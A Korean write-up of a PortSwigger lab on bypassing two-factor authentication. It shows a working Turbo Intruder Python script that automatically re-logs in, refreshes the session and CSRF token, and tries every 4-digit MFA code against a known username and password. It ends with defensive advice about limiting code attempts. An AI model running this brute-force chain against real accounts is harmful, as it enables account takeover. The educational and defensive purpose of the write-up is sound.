+++
date = '2026-08-08T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - 2FA bypass using a brute-force attack'
summary = "매 시도마다 세션·CSRF·재로그인이 강제되는 2FA를 상태 머신 스크립트로 자동 연쇄해, 시도 제한이 없는 4자리 코드를 전수 대입으로 뚫는 EXPERT Authentication 풀이"
toc = true
tags = ["Authentication", "Multi-Factor Authentication", "Brute Force", "PortSwigger", "Expert"]
+++

---

## 문제 분석

> **난이도**: `EXPERT`  
> **Lab**: [2FA bypass using a brute-force attack](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)

> ![image.png](/writeup/portswigger/authentication/14/1.png)

이 랩은 2단계 인증의 브루트포스에 취약하다. 유효한 username·password는 알고 있지만 2단계 코드에는 접근할 수 없다. 코드를 브루트포스해 `carlos`의 계정 페이지에 접근하면 문제가 해결된다. 대상 계정은 `carlos:montoya`이며, 공격 중 코드가 리셋될 수 있다고 명시되어 있다.

### Authentication 진단

`carlos`로 로그인한 뒤 2차 인증 코드 요청을 확인한다.

```http
POST /login2 HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded

csrf=GWBENVCkhpvE79cie1BglnMbawyIFuTd&mfa-code=0000
```

두 가지 제약이 관찰된다.

1. 요청에 **CSRF 토큰**이 함께 실리며, 매 요청마다 새 값으로 바뀐다.
2. 2차 코드가 틀리면 CSRF 토큰이 유효하더라도 **세션이 무효화되어 다시 로그인**해야 한다.

이 두 제약 외에 별도의 시도 횟수 제한은 없다. 즉 코드(0000–9999)는 전수 대입이 가능하지만, **한 번 틀릴 때마다 "재로그인 → 새 세션 → 2FA 페이지에서 새 CSRF 확보 → 다음 코드 시도"**의 연쇄를 자동으로 이어 붙여야 한다. 단순 Intruder로는 불가능하고, 응답에서 다음 요청 재료를 추출하는 상태 머신이 필요하다.

---

## 익스플로잇

기준점(2차 인증 첫 시도 요청)에서 시작해, 실패할 때마다 세션·CSRF·로그인 요청을 연쇄로 이어 가도록 스크립트를 구성한다. Turbo Intruder를 사용했으며 HTTP/2 세션 체인이므로 동시성 1로 순차 실행한다.

```python
import re

# 매 실행마다 바뀌는 랩 인스턴스 호스트 -> 반드시 본인 것으로 교체
HOST = "<lab-id>.web-security-academy.net"

engine  = None
code    = 0       # 현재 시도할 4자리 코드 (int)
session = ''      # 현재 세션
csrf    = ''      # 현재 csrf 토큰
found   = False

def queueRequests(target, wordlists):
    global engine, session, csrf
    # 세션 체인이므로 반드시 순차 실행(동시성 1). HTTP/2 라 Engine.BURP2 필요.
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           engine=Engine.BURP2)

    # launch한 요청(POST /login2)에 담긴 유효한 init 세션/토큰으로 시작
    m = re.search(r"[Cc]ookie: session=([^;\r\n]+)", target.req)
    session = m.group(1) if m else None
    m = re.search(r"csrf=([^&\r\n]+)", target.req)
    csrf = m.group(1) if m else None

    engine.queue(mfa_post(), label="mfa")   # 첫 시도: code=0000

# ---------- 요청 빌더 ----------

def http(method, path, sess, body):
    r = "%s %s HTTP/2\r\nHost: %s\r\nCookie: session=%s\r\n" % (method, path, HOST, sess)
    if body is not None:
        r += "Content-Type: application/x-www-form-urlencoded\r\n"
        r += "Content-Length: %d\r\n" % len(body)
    r += "\r\n"
    if body is not None:
        r += body
    return r

def mfa_post():
    body = "csrf=%s&mfa-code=%s" % (csrf, str(code).zfill(4))
    return http("POST", "/login2", session, body)

def login_post():
    body = "csrf=%s&username=carlos&password=montoya" % csrf
    return http("POST", "/login", session, body)

def login2_get():
    return http("GET", "/login2", session, None)

# ---------- 응답에서 값 추출 ----------

def get_session(req):
    m = re.search(r"set-cookie:\s*session=([^;\s]+)", req.response, re.I)
    return m.group(1) if m else None

def get_csrf(resp):
    m = re.search(r'name="csrf" value="([^"]+)"', resp)
    return m.group(1) if m else None

# ---------- 상태 머신 ----------

def handleResponse(req, interesting):
    global session, csrf, code, found
    if found:
        return

    if req.label == "mfa":
        table.add(req)
        # 오답이면 항상 'Incorrect security code' 가 포함됨 -> 없으면 정답 후보
        if "Incorrect security code" not in req.response:
            found = True
            table.add(req)          # 성공 응답 -> 결과 테이블에서 수동 확인
            return
        # 오답 -> 로그아웃 페이지. 새 세션 + /login 폼 csrf 확보
        session = get_session(req) or session
        csrf = get_csrf(req.response) or csrf
        code += 1
        if code > 9999:
            return                  # 전 범위 소진
        engine.queue(login_post(), label="login")

    elif req.label == "login":
        # 302 -> 새 세션
        session = get_session(req) or session
        engine.queue(login2_get(), label="getmfa")

    elif req.label == "getmfa":
        # mfa 폼 페이지 -> 새 csrf (이 응답엔 보통 Set-Cookie 없음)
        session = get_session(req) or session
        csrf = get_csrf(req.response) or csrf
        engine.queue(mfa_post(), label="mfa")
```

상태 머신은 세 라벨(`mfa` → `login` → `getmfa` → 다시 `mfa`)을 돌며, 매 실패마다 응답에서 새 세션과 CSRF를 뽑아 다음 코드 시도를 조립한다. 오답 판정은 응답에 `Incorrect security code`가 있는지로 하고, 없으면 정답으로 보고 중단한다. 실행하면 `0912`에서 302 응답이 관찰된다.

![image.png](/writeup/portswigger/authentication/14/2.png)

해당 응답의 세션값으로 `/my-account`에 접근하면 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/14/3.png)

---

## 정리

이 랩은 [2FA broken logic](/write-up/portswigger/authentication/write-up-portswigger---2fa-broken-logic/)과 마찬가지로 "4자리 코드에 시도 제한이 없다"는 결함을 공략하지만, 브루트포스를 **의도적으로 어렵게** 만들어 두었다. 매 시도마다 CSRF 토큰이 갱신되고, 실패하면 세션이 무효화되어 재로그인이 강제된다. 이 방어들은 단순 반복 대입을 막지만, **시도 자체의 총량을 제한하지는 않는다.** 그래서 재로그인·CSRF 재확보를 자동으로 연쇄하기만 하면 10,000개 코드는 여전히 전수 대입된다.

핵심은 CSRF 토큰 갱신이나 세션 재발급이 브루트포스 **방어가 아니라는** 점이다. 그것들은 요청 위조나 세션 고정을 막는 장치일 뿐, 코드 추측 횟수를 줄이지 않는다. 2FA 코드를 실효적으로 지키려면 **코드 자체에 시도 제한**을 걸어야 한다 — 몇 회 실패 시 해당 코드를 폐기하고 재발급을 강제하거나, 계정·세션 단위로 2단계 시도 횟수를 세어 차단한다. "코드가 리셋될 수 있다"는 랩의 안내는 이 방향의 부분적 방어(주기적 코드 갱신)를 흉내 낸 것이지만, 총량 제한이 없으면 결국 뚫린다.

기법적으로 이 랩은 **상태를 이어 가는 브루트포스**의 전형이다. 각 시도가 이전 응답의 산출물(세션·토큰)에 의존할 때는 Intruder의 병렬 대입이 통하지 않고, 응답을 파싱해 다음 요청을 만드는 순차 상태 머신이 필요하다. 이 패턴은 MFA뿐 아니라 CSRF 토큰이 매번 바뀌는 다단계 흐름 전반에 적용된다.
